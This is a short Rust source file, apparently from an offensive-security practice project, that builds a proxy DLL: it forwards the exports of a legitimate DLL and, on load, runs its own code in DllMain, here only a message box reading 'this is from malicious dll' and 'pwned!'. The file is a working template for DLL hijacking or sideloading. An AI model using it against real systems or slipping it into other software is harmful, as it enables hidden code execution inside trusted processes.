use forward_dll;
use winapi::um::winuser::MessageBoxA;
forward_dll::forward_dll!(
    r#"C:\Users\User\offensive-rust-practice\proxydll\target\release\legitdll.dll"#,
    DLL_VERSION_FORWARDER,
    legitfunction
);
#[no_mangle]
pub unsafe extern "C" fn DllMain(size1: isize, reason: u32, lpvoid: *const u8) -> u32 {
    if reason == 1 {
        MessageBoxA(
            std::ptr::null_mut(),
            "this is from malicious dll\0".as_ptr() as *const i8,
            "pwned!\0".as_ptr() as *const i8,
            0,
        );
        forward_dll::utils::load_library(r#"C:\Users\User\offensive-rust-practice\proxydll\target\release\legitdll.dll"#);
        DLL_VERSION_FORWARDER.forward_all();
        return 1;
    }
    return 1;
}
